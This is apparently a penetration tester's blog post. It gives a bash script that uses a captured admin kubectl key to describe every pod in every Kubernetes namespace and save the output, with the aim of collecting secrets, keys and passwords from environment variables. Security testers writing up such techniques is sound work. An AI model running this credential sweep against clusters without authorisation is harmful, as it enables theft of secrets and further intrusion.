---
layout: post
title: "Describing All Kubernetes Pods of All Namespaces for Fun and Profit"
author: "Joshua Rogers"
categories: security
---

In a recent pentest, I was able to gain access to the admin kubernetes kubectl key.

Once I had this access, I wanted to iterate through each of the k8s namespaces, and describe each of the pods in each of the namespaces.
Once every pod has been described, you can take a look at all of the environmental values, which generally contain secrets, keys, and passwords.

When running the script, it is assumed `KUBECONFIG` is already exported to the location of the kube_control file.


```bash
#!/bin/bash

# Get the list of namespaces using kubectl
namespaces=$(kubectl get namespaces -o custom-columns="NAME:.metadata.name" --no-headers)

describe_and_print() {
  kubectl describe pod $2 > descriptions/$1/$2
  echo "Described '$1/$2'"
}
export -f describe_and_print

# Loop through each namespace
for namespace in $namespaces; do
  mkdir -p descriptions/$namespace
  # Use a namespace
  kubectl config set-context --current --namespace="$namespace"
  echo "Switched to namespace '$namespace'"
  # Get pods in the current namespace
  pods=$(kubectl get pods -o custom-columns="NAME:.metadata.name" --no-headers)
  for pod in $pods; do
    echo describe_and_print "$namespace" "$pod"
  done | parallel --gnu -j20 --delay 0.1 --line-buffer
done
```
